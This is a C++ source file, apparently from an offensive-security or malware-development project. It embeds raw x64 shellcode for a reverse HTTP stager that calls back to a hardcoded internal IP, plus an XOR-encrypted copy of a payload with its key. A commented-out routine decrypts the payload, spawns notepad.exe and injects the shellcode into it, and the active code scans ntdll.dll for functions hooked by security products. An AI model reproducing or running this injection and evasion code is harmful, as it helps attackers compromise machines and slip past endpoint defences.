
#include <iostream>
#include <list>
#include "Global.h"
#include "Process.h"
#include "ProcessInjection.h"
#include "Crypto.h"

#include "Hooking.h"


const unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4f\x6e\x6d\x33\x00\x6e\xeb\xb7\x03\x9f\x76\xf1\xc9\x65\x55\xa6\x09\x3a\x63\x32\xdc\x7d\xa8\x65\x6d\xc2\x2b\x05\x35\x89\x5b\xa8\x3f\x9f\x35\x78\x76\xd7\x82\xcc\x71\xba\x22\xcd\x98\x59\x0b\x07\xf2\x04\x34\x3f\x22\xa2\x9e\x12\x2a\xbc\xfc\x81\x3e\x59\x85\xa0\x21\x00\x01\x02\xf0\x9e\x9d\x58\xd8\x53\xb5\x75\xc1\xf4\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x46\x75\x6e\x57\x65\x62\x50\x72\x6f\x64\x75\x63\x74\x73\x29\x0d\x0a\x00\xd2\x38\xee\x6f\xc1\x17\x0f\x57\x3d\x92\xb9\xbe\x25\x31\xa6\xe9\x81\x8f\x66\xb9\x65\x0f\x03\x07\x18\x29\xd3\x5e\xc0\x20\x3e\x98\x76\x01\xc4\xc6\xfb\x5f\xe9\xca\x16\x90\x3b\xba\xcb\xc2\xd5\x89\xc4\x45\x41\x2f\xcf\x15\x2f\x64\x93\x78\xe6\x94\x02\xe1\xcd\xf1\xec\xf1\x6e\xca\x7f\xa1\xd1\x37\x12\x67\xf4\xc9\x3f\xfa\xaf\xd1\x43\xc1\x09\x2b\xb4\x44\x57\x97\x8f\x9d\xb2\xf9\x81\xc2\xb7\x22\xa5\x96\x37\x43\x94\xe4\x9c\x33\x17\x45\xab\x37\x3a\xc4\x1d\xb6\x6b\x69\x39\xc1\x37\x38\xbd\x13\xad\xa8\x89\x52\x0c\x99\xb3\x69\x0f\x54\x36\xba\x98\xc2\xf0\xd9\x7e\x33\x46\x66\xab\x40\xf2\xc0\x39\xb4\xf4\x49\x8b\xe8\x33\x84\x3c\xcb\xbc\xeb\x56\xf2\x31\xd4\x76\x52\x65\x0b\x67\x54\xe8\x76\xc7\x7d\xf1\xc2\xc2\x39\x78\xf7\x7e\x48\x8b\xf7\x2b\x17\x20\x7b\xd2\x45\x4d\x2c\xbe\x47\xe7\x9e\x8f\xda\x6b\x15\x20\xa6\xc3\xab\xdb\xb6\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x30\x2e\x30\x2e\x31\x39\x39\x00\x03\x85\xd7\x78";

const unsigned char encrypted[] = "\x9d\x24\xef\x81\x9c\x9d\xa1\x61\x61\x6c\x2d\x34\x2d\x25\x3b\x30\x37\x24\x5d\xb7\x09\x3d\xe2\x33\x01\x24\xe7\x37\x74\x3d\xe2\x33\x41\x24\xe7\x17\x3c\x3d\x66\xd6\x2b\x26\x21\x54\xa5\x3d\x58\xa1\xcd\x50\x0d\x19\x6e\x59\x49\x20\xa0\xa5\x61\x24\x6d\xb4\x8b\x8c\x33\x2d\x3d\x2d\xe7\x27\x49\xea\x23\x50\x24\x64\xbc\x13\xe8\x19\x79\x67\x6e\x10\x1e\xfe\xe9\xe9\x61\x6c\x6c\x2d\xe9\xb5\x1d\x06\x29\x6d\xbc\x35\xe7\x3d\x71\x25\xea\x2c\x4c\x2c\x6d\xa5\x8a\x37\x29\x93\xa5\x24\xe7\x41\xe1\x29\x60\xba\x21\x54\xa5\x3d\x58\xa1\xcd\x2d\xad\xac\x61\x34\x68\xa0\x59\x8c\x19\x94\x20\x76\x25\x45\x69\x29\x55\xb4\x19\xad\x31\x25\xea\x2c\x48\x2c\x6d\xa5\x0f\x20\xea\x60\x24\x21\xe7\x35\x75\x28\x60\xbc\x2d\xee\x68\xfd\x21\x60\xb1\x2d\x34\x24\x34\x2b\x30\x3b\x20\x34\x2d\x3c\x2d\x2f\x21\xe2\x8d\x4c\x2d\x37\x93\x95\x31\x20\x38\x36\x24\xee\x7e\x9c\x26\x9e\x9e\x93\x31\x0f\x6c\x3c\xd7\x16\x08\x02\x05\x0b\x09\x01\x69\x20\x37\x25\xe5\x83\x20\xfc\x98\x20\xdb\x20\x1b\x43\x6b\x8a\xbc\x29\x50\xa5\x24\x54\xbe\x38\x58\xa1\x2c\x5d\xa5\x24\x3c\x34\x39\x20\xdb\x56\x3a\x1c\xcb\x8a\xbc\x8a\x12\x36\x24\xec\xad\x34\xd1\x31\x61\x6c\x6c\x28\x5d\xbc\x28\x30\x20\x3d\x06\x66\x2d\x24\x28\xdb\x36\xe5\xf3\xa3\x93\xa0\x82\x38\x3a\x24\xe5\xa4\x24\x44\xbb\x28\xe8\xb4\x21\x54\xa5\x27\x01\x61\x63\x2c\xe8\x37\x3e\x34\xd3\x8a\x34\x42\x57\x9a\xb9\x3d\xe0\xa7\x29\xef\xaf\x35\x06\x7f\x36\x29\xe8\x9d\x24\xec\xb6\x3c\xae\xa1\x9e\x93\x93\x9a\x21\x44\xa0\x33\x33\x2d\xd6\x48\x6a\x6d\x12\x9e\xb4\xe9\xac\x6a\xe9\xe8\x68\x61\x61\x24\x93\xaa\x63\xf1\xe5\x60\x61\x6c\x87\xb6\x85\x91\x68\x61\x61\x84\xce\x9a\x93\x8a\x46\x2e\x0f\x01\x5f\x65\x02\x9e\xde\x62\xfe\x1a\x9d\xac\x09\x20\xcf\x68\x5b\x0f\x5e\xb9\x11\xdd\x0c\x0c\xa3\x47\x69\x50\xe5\x2e\xc1\x5e\xfe\x59\x14\x13\xbb\xf7\xa5\x10\xdb\x4e\xa1\xfd\x35\x7e\x6e\x93\x65\x58\x53\x47\xce\xeb\x7b\x4b\xdd\x90\xed\x5b\x35\xf0\xc9\x40\x61\x6d\x6e\x95\xf2\xe8\x31\xb9\x32\xd9\x19\xa4\x98\x75\x3c\x12\x04\x1e\x41\x24\x0b\x10\x07\x15\x5b\x4c\x21\x0a\x16\x1c\x05\x0d\x00\x43\x59\x4b\x5c\x55\x41\x02\x0e\x01\x1c\x04\x18\x1c\x0b\x0d\x04\x57\x4c\x28\x3f\x3c\x2c\x41\x58\x42\x5c\x5e\x4c\x22\x00\x0f\x05\x03\x1b\x16\x4c\x3b\x3d\x41\x57\x42\x5d\x5e\x4c\x22\x26\x36\x57\x58\x57\x45\x38\x07\x00\x05\x04\x02\x18\x4a\x59\x5b\x59\x5a\x41\x2a\x19\x0b\x3b\x10\x0b\x31\x13\x03\x08\x10\x0f\x01\x1a\x48\x6c\x66\x6c\xb7\x54\x9b\x06\xa0\x76\x63\x3b\x58\xfe\xcc\xd7\x44\x50\xca\x85\xe4\xe3\x13\xd0\x04\x6e\x6f\x6b\x7d\x45\xa6\x37\xa1\x41\x52\xf4\x13\x6d\xb1\xaf\x9a\x3e\x85\xa6\x73\xfc\x4e\xd3\xaa\xa3\xb9\xe5\xa1\x29\x34\x46\xae\x74\x43\x08\xf6\x14\x93\xfd\x63\x80\xa1\x9d\x89\x9d\x1b\xa3\x1e\xc0\xbd\x5b\x77\x0b\x81\xa0\x5e\x9b\xc3\xbd\x26\xad\x7c\x42\xd5\x25\x3b\xfb\xea\xf1\xc7\x90\xe0\xa3\xdb\x4e\xc0\xfa\x42\x2a\xf5\x85\xf0\x5f\x72\x29\xde\x5e\x5b\xa5\x71\xda\x0e\x05\x4c\xa8\x56\x59\xd1\x7f\xc8\xc4\xfc\x3b\x6d\xf8\xdf\x05\x6a\x38\x43\xd3\xf9\xa3\x9c\xb5\x1b\x5f\x33\x0f\xca\x21\x9e\xac\x5c\xd8\x81\x20\xea\x89\x5f\xe8\x59\xa7\xc9\x82\x37\x93\x5d\xb8\x13\x3e\x10\x62\x06\x35\x84\x1a\xa2\x11\x84\xab\xa3\x58\x14\x9b\x1b\x24\xfe\x9e\x4a\x76\x4c\x17\xb7\x29\x38\x45\xdf\x26\x8b\xf2\xea\xb6\x1e\x7c\x41\xc7\xaf\xc7\xbe\xda\x75\x28\xdf\x91\xd9\xce\x33\x93\xa0\x21\x50\xa8\xd6\x6c\x65\x2c\x75\x28\xd9\x61\x7c\x6c\x65\x2d\xcc\x29\x61\x61\x6c\x2d\xdf\x34\xd1\x3a\x84\x9e\xb9\x24\xf6\x3f\x26\x21\xe8\x86\x24\xe5\x94\x24\xfc\xb3\x20\xd9\x6c\x4c\x65\x6c\x3c\xe0\x98\x20\xd6\x7e\xf3\xe5\x97\x96\xb4\x29\xef\xa8\x45\xe9\xb5\x1d\xd7\x07\xe7\x6b\x2d\x6d\xb6\xec\xa1\x14\xbb\x34\x3d\x34\x3d\x6c\x61\x61\x6c\x6c\x35\xaf\x9d\xf6\x9c\x9e\x93\x5d\x55\x42\x45\x47\x51\x4f\x5d\x55\x5c\x6c\x76\xec\xb6\x19";

int main()
{
    /*unsigned char* decrypted = xorEncryptString((unsigned char*)encrypted, (unsigned char*)"alleluia", 889, 8);
    printHex((unsigned char *)decrypted, 889);

    int newPid = spawn_process((char*)"C:\\Windows\\System32\\notepad.exe");
    printf("%d\n", newPid);
    Sleep(2000);

    inject_shellcode_process_pid(newPid, (unsigned char*)decrypted, 889);
    Sleep(10000);
    delete decrypted;*/

    HANDLE hFile = NULL;
    HANDLE hMap = NULL;
    //void* data = GetFileFromDisk((char*)"C:\\Windows\\System32\\ntdll.dll", &hFile, &hMap);

    HMODULE hDll = LoadLibraryA((char*)"C:\\Windows\\System32\\ntdll.dll");

    std::list<FunctionWithName> fnsWithName = getListOfExport(hDll);
    std::list<FunctionWithName> hookedFunctions = getListOfHookedFunctions(fnsWithName);

    printf("List hooked...");
    for (std::list<FunctionWithName>::iterator it = hookedFunctions.begin(); it != hookedFunctions.end(); ++it) {
        PRINT_DEBUG("%p: %s - is HOOKED.\n", it->startAddr, it->name.c_str());
    }

    if (hFile != NULL) {
        CloseHandle(hFile);
    }
    
    if (hMap != NULL) {
        CloseHandle(hMap);
    }
}